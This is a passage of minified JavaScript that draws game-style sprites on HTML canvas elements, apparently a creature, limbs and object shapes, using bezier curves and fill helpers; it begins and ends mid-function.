      r.bezierCurveTo(e * 141, e * 324, e * 150, e * 324, e * 153, e * 320);
      r.bezierCurveTo(e * 168, e * 319, e * 171, e * 316, e * 173, e * 307);
      r.bezierCurveTo(e * 180, e * 305, e * 180, e * 301, e * 178, e * 296);
      r.bezierCurveTo(e * 183, e * 296, e * 185, e * 289, e * 188, e * 279);
      r.bezierCurveTo(e * 171, e * 286, e * 149, e * 290, e * 132, e * 289);
      r.bezierCurveTo(e * 101, e * 290, e * 86, e * 280, e * 74, e * 271);
      r.closePath();
      ye(r, i[5]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 76, e * 252);
      r.bezierCurveTo(e * 85, e * 294, e * 96, e * 314, e * 103, e * 314);
      r.bezierCurveTo(e * 106, e * 316, e * 151, e * 314, e * 156, e * 314);
      r.bezierCurveTo(e * 169, e * 317, e * 182, e * 285, e * 191, e * 256);
      r.bezierCurveTo(e * 134.5, e * 254, e * 134.5, e * 254, e * 78, e * 252);
      r.closePath();
      ye(r, i[2]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 84, e * 257);
      r.bezierCurveTo(e * 122, e * 273, e * 146, e * 268, e * 179, e * 261);
      r.bezierCurveTo(e * 190, e * 258, e * 187, e * 266, e * 178, e * 272);
      r.bezierCurveTo(e * 160, e * 284, e * 123, e * 282, e * 100, e * 277);
      r.bezierCurveTo(e * 73, e * 260, e * 79, e * 257, e * 84, e * 257);
      r.closePath();
      ye(r, i[1]);
      ze(r, e * 102, e * 269, e * 11);
      ye(r, i[3]);
      ze(r, e * 98, e * 266, e * 5);
      ye(r, i[6]);
      ze(r, e * 168, e * 269, e * 11);
      ye(r, i[3]);
      ze(r, e * 164, e * 266, e * 5);
      ye(r, i[6]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 125, e * 65);
      r.bezierCurveTo(e * 133, e * 45, e * 136, e * 42, e * 141, e * 55);
      r.bezierCurveTo(e * 151, e * 96, e * 164, e * 117, e * 175, e * 134);
      r.bezierCurveTo(e * 203, e * 181, e * 207, e * 182, e * 208, e * 215);
      r.bezierCurveTo(e * 206, e * 240, e * 205, e * 246, e * 184, e * 258);
      r.bezierCurveTo(e * 161, e * 267, e * 131, e * 272, e * 86, e * 258);
      r.bezierCurveTo(e * 67, e * 252, e * 68, e * 239, e * 64, e * 216);
      r.bezierCurveTo(e * 62, e * 194, e * 72, e * 169, e * 92, e * 142);
      r.bezierCurveTo(e * 106, e * 121, e * 114, e * 101, e * 125, e * 65);
      r.closePath();
      ye(r, i[2]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 115, e * 235);
      r.bezierCurveTo(e * 118, e * 258, e * 137, e * 268, e * 148, e * 246);
      r.bezierCurveTo(e * 156, e * 228, e * 152, e * 169, e * 150, e * 140);
      r.bezierCurveTo(e * 147, e * 87, e * 143, e * 69, e * 142, e * 60);
      r.bezierCurveTo(e * 136, e * 44, e * 132, e * 43, e * 127, e * 62);
      r.bezierCurveTo(e * 119, e * 116, e * 119, e * 140, e * 116, e * 166);
      r.bezierCurveTo(e * 113, e * 202, e * 113, e * 223, e * 115, e * 233);
      r.closePath();
      ye(r, i[4]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 132, e * 219);
      r.bezierCurveTo(e * 140, e * 229, e * 142, e * 231, e * 145, e * 237);
      r.bezierCurveTo(e * 145, e * 245, e * 139, e * 249, e * 133, e * 249);
      r.bezierCurveTo(e * 123, e * 248, e * 123, e * 243, e * 121, e * 239);
      r.bezierCurveTo(e * 126, e * 227, e * 129, e * 223, e * 132, e * 219);
      r.closePath();
      ye(r, i[8]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 133, e * 179);
      r.bezierCurveTo(e * 140, e * 188.5, e * 140, e * 188.5, e * 147, e * 198);
      r.bezierCurveTo(e * 148, e * 209, e * 142, e * 214, e * 133, e * 214);
      r.bezierCurveTo(e * 121, e * 211, e * 121, e * 207, e * 120, e * 200);
      r.bezierCurveTo(e * 126.5, e * 189.5, e * 126.5, e * 189.5, e * 133, e * 179);
      r.closePath();
      ye(r, i[8]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 133, e * 143);
      r.bezierCurveTo(e * 139, e * 151.5, e * 139, e * 151.5, e * 145, e * 160);
      r.bezierCurveTo(e * 143, e * 167, e * 140, e * 170, e * 134, e * 170);
      r.bezierCurveTo(e * 128, e * 169, e * 124, e * 167, e * 123, e * 161);
      r.bezierCurveTo(e * 128, e * 152, e * 128, e * 152, e * 133, e * 143);
      r.closePath();
      ye(r, i[8]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 133, e * 115);
      r.bezierCurveTo(e * 137.5, e * 121.5, e * 137.5, e * 121.5, e * 142, e * 128);
      r.bezierCurveTo(e * 141, e * 133, e * 138, e * 135, e * 133, e * 135);
      r.bezierCurveTo(e * 129, e * 135, e * 125, e * 132, e * 125, e * 129);
      r.bezierCurveTo(e * 129, e * 122, e * 129, e * 122, e * 133, e * 115);
      r.closePath();
      ye(r, i[8]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 133, e * 94);
      r.bezierCurveTo(e * 136.5, e * 98.5, e * 136.5, e * 98.5, e * 140, e * 103);
      r.bezierCurveTo(e * 139, e * 109, e * 137, e * 109, e * 133, e * 110);
      r.bezierCurveTo(e * 127, e * 108, e * 129, e * 107, e * 127, e * 105);
      r.bezierCurveTo(e * 130, e * 99.5, e * 130, e * 99.5, e * 133, e * 94);
      r.closePath();
      ye(r, i[8]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 130, e * 279);
      r.bezierCurveTo(e * 136.5, e * 287.5, e * 136.5, e * 287.5, e * 143, e * 296);
      r.bezierCurveTo(e * 143, e * 302, e * 139, e * 309, e * 131, e * 308);
      r.bezierCurveTo(e * 123, e * 306, e * 121, e * 303, e * 120, e * 297);
      r.bezierCurveTo(e * 125.5, e * 288.5, e * 125.5, e * 288.5, e * 131, e * 280);
      r.closePath();
      ye(r, i[8]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 147, e * 303);
      r.bezierCurveTo(e * 151, e * 311, e * 151, e * 319, e * 147, e * 321);
      r.bezierCurveTo(e * 138, e * 320, e * 145, e * 308, e * 147, e * 303);
      r.closePath();
      ye(r, i[8]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 115, e * 303);
      r.bezierCurveTo(e * 115, e * 312, e * 118, e * 319, e * 115, e * 319);
      r.bezierCurveTo(e * 112, e * 324, e * 109, e * 318, e * 109, e * 314);
      r.bezierCurveTo(e * 109, e * 308, e * 112, e * 303, e * 115, e * 303);
      r.closePath();
      ye(r, i[8]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 89, e * 280);
      r.bezierCurveTo(e * 83, e * 279, e * 80, e * 281, e * 81, e * 286);
      r.bezierCurveTo(e * 83, e * 290, e * 84, e * 290, e * 87, e * 286);
      r.closePath();
      ye(r, i[8]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 94, e * 290);
      r.bezierCurveTo(e * 93, e * 294, e * 90, e * 303, e * 86, e * 298);
      r.bezierCurveTo(e * 84, e * 295, e * 84, e * 291, e * 89, e * 291);
      r.closePath();
      ye(r, i[8]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 163, e * 295);
      r.bezierCurveTo(e * 175, e * 294, e * 176, e * 296, e * 175, e * 301);
      r.bezierCurveTo(e * 174, e * 305, e * 171, e * 305, e * 166, e * 300);
      r.closePath();
      ye(r, i[8]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 172, e * 286);
      r.bezierCurveTo(e * 180, e * 285, e * 181, e * 285, e * 180, e * 291);
      r.bezierCurveTo(e * 176, e * 295, e * 174, e * 294, e * 172, e * 286);
      r.closePath();
      ye(r, i[8]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 115, e * 37);
      r.bezierCurveTo(e * 116, e * 28, e * 119, e * 27, e * 126, e * 37);
      r.bezierCurveTo(e * 134, e * 48, e * 134, e * 49, e * 132, e * 59);
      r.bezierCurveTo(e * 131, e * 67, e * 127, e * 65, e * 120, e * 56);
      r.bezierCurveTo(e * 114, e * 49, e * 113, e * 43, e * 115, e * 38);
      r.closePath();
      ye(r, i[7]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 146, e * 34);
      r.bezierCurveTo(e * 152, e * 28, e * 155, e * 27, e * 157, e * 39);
      r.bezierCurveTo(e * 157, e * 45, e * 157, e * 49, e * 150, e * 56);
      r.bezierCurveTo(e * 141, e * 66, e * 138, e * 66, e * 138, e * 57);
      r.bezierCurveTo(e * 137, e * 50, e * 137, e * 47, e * 141, e * 42);
      r.closePath();
      ye(r, i[7]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 143, e * 69);
      r.bezierCurveTo(e * 148, e * 56, e * 156, e * 50, e * 158, e * 58);
      r.bezierCurveTo(e * 159, e * 64, e * 160, e * 67, e * 153, e * 77);
      r.bezierCurveTo(e * 148, e * 83, e * 145, e * 84, e * 143, e * 77);
      r.closePath();
      ye(r, i[7]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 149, e * 92);
      r.bezierCurveTo(e * 149, e * 89, e * 151, e * 84, e * 156, e * 79);
      r.bezierCurveTo(e * 161, e * 73, e * 163, e * 78, e * 162, e * 86);
      r.bezierCurveTo(e * 161, e * 91, e * 155, e * 99, e * 152, e * 98);
      r.closePath();
      ye(r, i[7]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 111, e * 61);
      r.bezierCurveTo(e * 114, e * 51, e * 117, e * 51, e * 124, e * 64);
      r.bezierCurveTo(e * 128, e * 68, e * 128, e * 76, e * 126, e * 79);
      r.bezierCurveTo(e * 123, e * 84, e * 122, e * 82, e * 115, e * 74);
      r.bezierCurveTo(e * 112, e * 67, e * 115, e * 74, e * 115, e * 74);
      r.bezierCurveTo(e * 111, e * 68, e * 111, e * 66, e * 111, e * 62);
      r.closePath();
      ye(r, i[7]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 107, e * 81);
      r.bezierCurveTo(e * 108, e * 74, e * 112, e * 73, e * 118, e * 84);
      r.bezierCurveTo(e * 122, e * 88, e * 122, e * 93, e * 121, e * 98);
      r.bezierCurveTo(e * 114, e * 98, e * 113, e * 98, e * 109, e * 90);
      r.bezierCurveTo(e * 107, e * 87, e * 106, e * 85, e * 107, e * 82);
      r.closePath();
      ye(r, i[7]);
      return t;
    }
    function hr(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 85;
      t.height = e * 145;
      r.translate(e * -20, e * -95);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 50, e * 105);
      r.bezierCurveTo(e * 52, e * 119, e * 64, e * 137, e * 71, e * 146);
      r.bezierCurveTo(e * 71, e * 161, e * 74, e * 169, e * 79, e * 179);
      r.bezierCurveTo(e * 68, e * 192, e * 70, e * 204, e * 69, e * 216);
      r.bezierCurveTo(e * 50, e * 189.5, e * 50, e * 189.5, e * 31, e * 163);
      r.closePath();
      ye(r, i[1]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 44, e * 106);
      r.bezierCurveTo(e * 49, e * 90, e * 58, e * 104, e * 51, e * 121);
      r.bezierCurveTo(e * 45, e * 143, e * 41, e * 151, e * 37, e * 162);
      r.bezierCurveTo(e * 48, e * 180, e * 58, e * 188, e * 76, e * 205);
      r.bezierCurveTo(e * 104, e * 209, e * 105, e * 229, e * 92, e * 235);
      r.bezierCurveTo(e * 76, e * 239, e * 75, e * 232, e * 56, e * 213);
      r.bezierCurveTo(e * 31, e * 187, e * 28, e * 176, e * 23, e * 162);
      r.bezierCurveTo(e * 38, e * 131, e * 40, e * 120, e * 44, e * 106);
      r.closePath();
      ye(r, i[2], i[3], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 30, e * 159);
      r.bezierCurveTo(e * 46, e * 157, e * 59, e * 152, e * 68, e * 148);
      r.bezierCurveTo(e * 63, e * 155, e * 52, e * 160, e * 44, e * 164);
      r.bezierCurveTo(e * 59, e * 169, e * 66, e * 174, e * 75, e * 178);
      r.bezierCurveTo(e * 58, e * 178, e * 49, e * 175, e * 37, e * 174);
      r.closePath();
      ye(r, i[2]);
      return t;
    }
    function Ir(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 85;
      t.height = e * 145;
      r.translate(e * -165, e * -95);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 217, e * 103);
      r.bezierCurveTo(e * 209, e * 129, e * 203, e * 137, e * 195, e * 146);
      r.bezierCurveTo(e * 195, e * 159, e * 194, e * 167, e * 189, e * 178);
      r.bezierCurveTo(e * 193, e * 186, e * 196, e * 195, e * 198, e * 216);
      r.bezierCurveTo(e * 217.5, e * 189.5, e * 217.5, e * 189.5, e * 237, e * 163);
      r.closePath();
      ye(r, i[1]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 231, e * 163);
      r.bezierCurveTo(e * 221, e * 139, e * 218, e * 128, e * 215, e * 114);
      r.bezierCurveTo(e * 213, e * 102, e * 220, e * 92, e * 222, e * 107);
      r.bezierCurveTo(e * 224, e * 118, e * 233, e * 138, e * 244, e * 161);
      r.bezierCurveTo(e * 235, e * 188, e * 224, e * 198, e * 204, e * 221);
      r.bezierCurveTo(e * 190, e * 233, e * 190, e * 235, e * 180, e * 235);
      r.bezierCurveTo(e * 167, e * 235, e * 164, e * 216, e * 175, e * 211);
      r.bezierCurveTo(e * 176, e * 208, e * 181, e * 207, e * 191, e * 205);
      r.bezierCurveTo(e * 213, e * 186, e * 218, e * 180, e * 230, e * 163);
      r.closePath();
      ye(r, i[2], i[3], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 234, e * 154);
      r.bezierCurveTo(e * 227, e * 156, e * 222, e * 156, e * 199, e * 148);
      r.bezierCurveTo(e * 201, e * 151, e * 216, e * 159, e * 224, e * 162);
      r.bezierCurveTo(e * 209, e * 169.5, e * 209, e * 169.5, e * 194, e * 177);
      r.bezierCurveTo(e * 213.5, e * 175, e * 213.5, e * 175, e * 233, e * 173);
      r.closePath();
      ye(r, i[2]);
      return t;
    }
    function ur(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 187;
      r.height = e * 119;
      n.globalAlpha = i ? 0.5 : 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.translate(0, 3);
      n.moveTo(e * 53, e * 45);
      n.bezierCurveTo(e * 3, e * 60, e * 11, e * 72, e * 19, e * 81);
      n.bezierCurveTo(e * 28, e * 82, e * 24, e * 81, e * 29, e * 82);
      n.bezierCurveTo(e * 26, e * 87, e * 28, e * 84, e * 28, e * 87);
      n.bezierCurveTo(e * 63, e * 101, e * 92, e * 100, e * 138, e * 93);
      n.bezierCurveTo(e * 172, e * 87, e * 180, e * 72, e * 168, e * 62);
      n.bezierCurveTo(e * 154, e * 51, e * 150, e * 50, e * 148, e * 49);
      n.bezierCurveTo(e * 132, e * 42, e * 90, e * 40, e * 55, e * 45);
      n.closePath();
      ye(n, t[5]);
      n.globalAlpha = 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.translate(0, -3);
      n.moveTo(e * 53, e * 45);
      n.bezierCurveTo(e * 3, e * 60, e * 11, e * 72, e * 19, e * 81);
      n.bezierCurveTo(e * 28, e * 82, e * 24, e * 81, e * 29, e * 82);
      n.bezierCurveTo(e * 26, e * 87, e * 28, e * 84, e * 28, e * 87);
      n.bezierCurveTo(e * 63, e * 101, e * 92, e * 100, e * 138, e * 93);
      n.bezierCurveTo(e * 172, e * 87, e * 180, e * 72, e * 168, e * 62);
      n.bezierCurveTo(e * 154, e * 51, e * 150, e * 50, e * 148, e * 49);
      n.bezierCurveTo(e * 132, e * 42, e * 90, e * 40, e * 55, e * 45);
      n.closePath();
      ye(n, t[0], t[1], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 151, e * 60);
      n.bezierCurveTo(e * 140, e * 36, e * 137, e * 32, e * 124, e * 29);
      n.bezierCurveTo(e * 98, e * 22, e * 80, e * 24, e * 62, e * 28);
      n.bezierCurveTo(e * 42, e * 35, e * 38, e * 46, e * 34, e * 58);
      n.bezierCurveTo(e * 53, e * 74, e * 76, e * 76, e * 91, e * 78);
      n.closePath();
      ye(n, t[0], t[1], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 37, e * 53);
      n.bezierCurveTo(e * 30, e * 56, e * 29, e * 67, e * 30, e * 68);
      n.bezierCurveTo(e * 94, e * 108, e * 150, e * 76, e * 155, e * 70);
      n.bezierCurveTo(e * 154, e * 60, e * 151, e * 54, e * 149, e * 53);
      n.bezierCurveTo(e * 101, e * 74, e * 66, e * 66, e * 37, e * 53);
      n.closePath();
      ye(n, t[2], t[3], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 100, e * 36);
      n.bezierCurveTo(e * 92, e * 25, e * 86, e * 28, e * 82, e * 34);
      n.bezierCurveTo(e * 88, e * 40, e * 93, e * 40, e * 98, e * 36);
      n.closePath();
      ye(n, t[0], t[1], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 80, e * 43);
      n.bezierCurveTo(e * 69, e * 46, e * 67, e * 52, e * 69, e * 58);
      ye(n, undefined, t[1], e * 4);
      ze(n, e * 58, e * 50, e * 5);
      ye(n, t[4]);
      ze(n, e * 43, e * 65, e * 5);
      ye(n, t[4]);
      ze(n, e * 58, e * 73, e * 5);
      ye(n, t[4]);
      ze(n, e * 58, e * 50, e * 2);
      ye(n, t[5]);
      ze(n, e * 43, e * 65, e * 2);
      ye(n, t[5]);
      ze(n, e * 58, e * 73, e * 2);
      ye(n, t[5]);
      return r;
    }
    function lr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 180;
      r.height = e * 120;
      n.translate(e * -65, e * -35);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 10);
      n.save();
      n.translate(e * 150.5, e * 63.84375);
      Be(n, e * -67, e * -16.5, e * 134, e * 33, e * 5);
      n.restore();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 80.5, e * 75.34375);
      n.bezierCurveTo(e * 83, e * 106.34375, e * 83, e * 106.34375, e * 85.5, e * 137.34375);
      n.bezierCurveTo(e * 93, e * 135.84375, e * 93, e * 135.84375, e * 100.5, e * 134.34375);
      n.bezierCurveTo(e * 99.5, e * 100.84375, e * 99.5, e * 100.84375, e * 98.5, e * 67.34375);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 206.5, e * 71.34375);
      n.bezierCurveTo(e * 203.5, e * 104.34375, e * 203.5, e * 104.34375, e * 200.5, e * 137.34375);
      n.bezierCurveTo(e * 208.5, e * 137.34375, e * 208.5, e * 137.34375, e * 216.5, e * 137.34375);
      n.bezierCurveTo(e * 219, e * 102.84375, e * 219, e * 102.84375, e * 221.5, e * 68.34375);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 136.5, e * 75.34375);
      n.bezierCurveTo(e * 139, e * 94.34375, e * 139, e * 94.34375, e * 141.5, e * 113.34375);
      n.bezierCurveTo(e * 149.5, e * 115.34375, e * 149.5, e * 115.34375, e * 157.5, e * 117.34375);
      n.bezierCurveTo(e * 162, e * 97.34375, e * 162, e * 97.34375, e * 166.5, e * 77.34375);
      n.closePath();
      ye(n, t[0]);
      n.save();
      n.translate(e * 152.5, e * 80.84375);
      n.rotate(3.12);
      Be(n, e * -73, e * -20.5, e * 146, e * 41, e * 5);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(0, e * -10);
      n.save();
      n.translate(e * 150.5, e * 63.84375);
      Be(n, e * -67, e * -16.5, e * 134, e * 33, e * 5);
      n.restore();
      ye(n, t[1], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 80.5, e * 75.34375);
      n.bezierCurveTo(e * 83, e * 106.34375, e * 83, e * 106.34375, e * 85.5, e * 137.34375);
      n.bezierCurveTo(e * 93, e * 135.84375, e * 93, e * 135.84375, e * 100.5, e * 134.34375);
      n.bezierCurveTo(e * 99.5, e * 100.84375, e * 99.5, e * 100.84375, e * 98.5, e * 67.34375);
      n.closePath();
      ye(n, t[1], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 206.5, e * 71.34375);
      n.bezierCurveTo(e * 203.5, e * 104.34375, e * 203.5, e * 104.34375, e * 200.5, e * 137.34375);
      n.bezierCurveTo(e * 208.5, e * 137.34375, e * 208.5, e * 137.34375, e * 216.5, e * 137.34375);
      n.bezierCurveTo(e * 219, e * 102.84375, e * 219, e * 102.84375, e * 221.5, e * 68.34375);
      n.closePath();
      ye(n, t[1], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 136.5, e * 75.34375);
      n.bezierCurveTo(e * 139, e * 94.34375, e * 139, e * 94.34375, e * 141.5, e * 113.34375);
      n.bezierCurveTo(e * 149.5, e * 115.34375, e * 149.5, e * 115.34375, e * 157.5, e * 117.34375);
      n.bezierCurveTo(e * 162, e * 97.34375, e * 162, e * 97.34375, e * 166.5, e * 77.34375);
      n.closePath();
      ye(n, t[1], t[2], e * 4);
      n.save();
      n.translate(e * 152.5, e * 80.84375);
      n.rotate(3.12);
      Be(n, e * -73, e * -20.5, e * 146, e * 41, e * 5);
      n.restore();
      ye(n, t[1], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 83.5, e * 73.34375);
      n.bezierCurveTo(e * 93.5, e * 70.34375, e * 105.5, e * 70.34375, e * 124.5, e * 72.34375);
      n.bezierCurveTo(e * 132.5, e * 78.34375, e * 162.5, e * 80.34375, e * 176.5, e * 76.34375);
      n.bezierCurveTo(e * 194.5, e * 69.34375, e * 192.5, e * 68.34375, e * 199.5, e * 63.34375);
      n.bezierCurveTo(e * 204.5, e * 63.34375, e * 204.5, e * 63.34375, e * 209.5, e * 63.34375);
      n.bezierCurveTo(e * 153.5, e * 82.34375, e * 157.5, e * 85.34375, e * 209.5, e * 63.34375);
      n.bezierCurveTo(e * 194.5, e * 88.34375, e * 162.5, e * 87.34375, e * 149.5, e * 88.34375);
      n.bezierCurveTo(e * 129.5, e * 81.34375, e * 103.5, e * 75.34375, e * 83.5, e * 82.34375);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 137.5, e * 65.34375);
      n.bezierCurveTo(e * 150.5, e * 76.34375, e * 170.5, e * 71.34375, e * 174.5, e * 65.34375);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 221.5, e * 85.34375);
      n.bezierCurveTo(e * 211.5, e * 79.34375, e * 191.5, e * 88.34375, e * 181.5, e * 96.34375);
      n.bezierCurveTo(e * 201.5, e * 96.34375, e * 201.5, e * 96.34375, e * 221.5, e * 96.34375);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 84.5, e * 89.34375);
      n.bezierCurveTo(e * 102.5, e * 87.34375, e * 112.5, e * 88.34375, e * 119.5, e * 97.34375);
      n.bezierCurveTo(e * 102, e * 98.34375, e * 102, e * 98.34375, e * 84.5, e * 99.34375);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 208.5, e * 104.34375);
      n.bezierCurveTo(e * 208.5, e * 110.34375, e * 208.5, e * 110.34375, e * 208.5, e * 116.34375);
      n.bezierCurveTo(e * 211.5, e * 110.34375, e * 211.5, e * 110.34375, e * 214.5, e * 104.34375);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 87.5, e * 117.34375);
      n.bezierCurveTo(e * 92, e * 118.84375, e * 92, e * 118.84375, e * 96.5, e * 120.34375);
      n.bezierCurveTo(e * 93, e * 123.84375, e * 93, e * 123.84375, e * 89.5, e * 127.34375);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 107.5, e * 51.34375);
      n.bezierCurveTo(e * 122.5, e * 54.34375, e * 122.5, e * 54.34375, e * 137.5, e * 57.34375);
      n.bezierCurveTo(e * 118, e * 57.34375, e * 118, e * 57.34375, e * 98.5, e * 57.34375);
      n.bezierCurveTo(e * 94.5, e * 54.84375, e * 94.5, e * 54.84375, e * 90.5, e * 52.34375);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 170.5, e * 52.34375);
      n.bezierCurveTo(e * 179.5, e * 51.84375, e * 179.5, e * 51.84375, e * 188.5, e * 51.34375);
      n.bezierCurveTo(e * 187.5, e * 53.84375, e * 187.5, e * 53.84375, e * 186.5, e * 56.34375);
      n.bezierCurveTo(e * 177, e * 56.34375, e * 177, e * 56.34375, e * 167.5, e * 56.34375);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 80.5, e * 69.34375);
      n.bezierCurveTo(e * 86.5, e * 70.34375, e * 86.5, e * 70.34375, e * 92.5, e * 71.34375);
      n.bezierCurveTo(e * 86, e * 73.34375, e * 86, e * 73.34375, e * 79.5, e * 75.34375);
      n.closePath();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 222.5, e * 75.34375);
      n.bezierCurveTo(e * 214.5, e * 76.34375, e * 214.5, e * 76.34375, e * 206.5, e * 77.34375);
      n.bezierCurveTo(e * 216.5, e * 79.34375, e * 216.5, e * 79.34375, e * 226.5, e * 81.34375);
      n.closePath();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 116.5, e * 100.34375);
      n.bezierCurveTo(e * 128, e * 97.34375, e * 128, e * 97.34375, e * 139.5, e * 94.34375);
      n.bezierCurveTo(e * 140, e * 96.84375, e * 140, e * 96.84375, e * 140.5, e * 99.34375);
      n.closePath();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 112.5, e * 48.34375);
      n.bezierCurveTo(e * 115.5, e * 50.84375, e * 115.5, e * 50.84375, e * 118.5, e * 53.34375);
      n.bezierCurveTo(e * 131, e * 50.84375, e * 131, e * 50.84375, e * 143.5, e * 48.34375);
      n.closePath();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 216.5, e * 109.34375);
      n.bezierCurveTo(e * 213, e * 114.84375, e * 213, e * 114.84375, e * 209.5, e * 120.34375);
      n.bezierCurveTo(e * 212, e * 118.84375, e * 212, e * 118.84375, e * 214.5, e * 117.34375);
      n.closePath();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 86.5, e * 133.34375);
      n.bezierCurveTo(e * 89, e * 127.34375, e * 89, e * 127.34375, e * 91.5, e * 121.34375);
      n.bezierCurveTo(e * 92.5, e * 127.34375, e * 92.5, e * 127.34375, e * 93.5, e * 133.34375);
      n.closePath();
      ye(n, t[2]);
      return r;
    }
    function Or(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 175;
      r.height = e * 106;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 28, e * 67);
      n.bezierCurveTo(e * 55, e * 80, e * 126, e * 74, e * 144, e * 68);
      n.bezierCurveTo(e * 144.5, e * 75, e * 144.5, e * 75, e * 145, e * 82);
      n.bezierCurveTo(e * 114, e * 94, e * 47, e * 91, e * 28, e * 82);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(0, e * -8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 145, e * 75);
      n.bezierCurveTo(e * 143, e * 51, e * 133, e * 29, e * 100, e * 27);
      n.bezierCurveTo(e * 52, e * 21, e * 37, e * 37, e * 31, e * 54);
